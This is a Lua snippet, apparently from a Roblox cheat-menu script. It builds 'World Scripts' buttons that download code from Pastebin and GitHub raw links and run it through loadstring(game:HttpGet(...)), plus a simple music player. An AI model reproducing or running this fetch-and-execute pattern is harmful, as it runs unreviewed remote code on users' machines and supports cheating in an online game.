-- === WORLDS TAB ===
worldsTab:CreateLabel("World Scripts", "")
local worldButtons = {
    ["Coffee Shop"] = "https://pastebin.com/raw/Pvj5Ckc2", ["ClockworkArena"] = "https://pastebin.com/raw/NNp1NJKT",
    ["Shipment"] = "https://pastebin.com/raw/J3Jk3NaC", ["PurpleBattlefields"] = "https://pastebin.com/raw/kdg5tmdg",
    ["Lock Shift"] = "https://github.com/ltseverydayyou/uuuuuuu/blob/main/shiftlock?raw=true",
}
for name, url in pairs(worldButtons) do
    worldsTab:CreateButton(name, function() pcall(function() loadstring(game:HttpGet(url, true))() end) end)
end

-- === MUSIC TAB ===
musicTab:CreateLabel("Music Player", "")
local currentMusic = nil
local function playMusic(soundId, looped)
    if currentMusic and currentMusic.Parent then currentMusic:Destroy() end -- Stop previous song
    local sound = Instance.new("Sound")
    sound.SoundId, sound.Looped, sound.Volume, sound.Parent = "rbxassetid://" .. tostring(soundId), looped or false, 1, game:GetService("SoundService")
    sound:Play()
    currentMusic = sound
    if not sound.Looped then sound.Ended:Connect(function() sound:Destroy() end) end
end
musicTab:CreateButton("New World", function() playMusic(5410082346, true) end)
